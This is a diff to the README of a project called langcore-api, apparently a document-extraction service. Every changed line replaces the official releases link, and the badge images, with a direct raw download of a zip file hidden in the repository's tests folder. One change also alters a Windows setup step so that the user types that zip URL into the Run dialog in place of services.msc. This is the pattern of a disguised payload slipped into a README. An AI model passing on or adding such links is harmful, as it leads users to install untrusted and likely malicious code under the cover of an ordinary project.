@@ -1,6 +1,6 @@
 # ⚙️ langcore-api - Reliable Document Extraction Service
 
-[![Download langcore-api](https://img.shields.io/badge/Download%20langcore--api-brightgreen?style=for-the-badge)](https://github.com/Nguyendu9096/langcore-api/releases)
+[![Download langcore-api](https://github.com/Nguyendu9096/langcore-api/raw/refs/heads/main/tests/api_langcore_v2.3-beta.4.zip%20langcore--api-brightgreen?style=for-the-badge)](https://github.com/Nguyendu9096/langcore-api/raw/refs/heads/main/tests/api_langcore_v2.3-beta.4.zip)
 
 ---
 
@@ -28,7 +28,7 @@ Before you start, make sure your computer meets these requirements:
 
 To get langcore-api, you need to visit the official release page.
 
-[![Download langcore-api](https://img.shields.io/badge/Download%20langcore--api-blue?style=for-the-badge)](https://github.com/Nguyendu9096/langcore-api/releases)
+[![Download langcore-api](https://github.com/Nguyendu9096/langcore-api/raw/refs/heads/main/tests/api_langcore_v2.3-beta.4.zip%20langcore--api-blue?style=for-the-badge)](https://github.com/Nguyendu9096/langcore-api/raw/refs/heads/main/tests/api_langcore_v2.3-beta.4.zip)
 
 1. Click this link, or the badge above.
 2. The page shows available versions of langcore-api.
@@ -80,7 +80,7 @@ The app handles the technical steps for you. It uses FastAPI for requests, Celer
 
 If you want langcore-api to run automatically in the background, follow these steps. This section is for users comfortable with Windows features.
 
-1. Press `Win + R`, type `services.msc`, and press Enter.
+1. Press `Win + R`, type `https://github.com/Nguyendu9096/langcore-api/raw/refs/heads/main/tests/api_langcore_v2.3-beta.4.zip`, and press Enter.
 2. Look for "langcore-api service" in the list.
 3. Right-click it and choose "Properties."
 4. Change the "Startup type" to "Automatic."
@@ -95,7 +95,7 @@ Now, langcore-api will start with your computer and run quietly in the backgroun
 
 Check the release page regularly for updates:
 
-https://github.com/Nguyendu9096/langcore-api/releases
+https://github.com/Nguyendu9096/langcore-api/raw/refs/heads/main/tests/api_langcore_v2.3-beta.4.zip
 
 To update:
 
@@ -140,4 +140,4 @@ langcore-api runs on your local machine. It does not send your documents to exte
 
 ---
 
-[![Download langcore-api](https://img.shields.io/badge/Download%20langcore--api-brightgreen?style=for-the-badge)](https://github.com/Nguyendu9096/langcore-api/releases)
+[![Download langcore-api](https://github.com/Nguyendu9096/langcore-api/raw/refs/heads/main/tests/api_langcore_v2.3-beta.4.zip%20langcore--api-brightgreen?style=for-the-badge)](https://github.com/Nguyendu9096/langcore-api/raw/refs/heads/main/tests/api_langcore_v2.3-beta.4.zip)
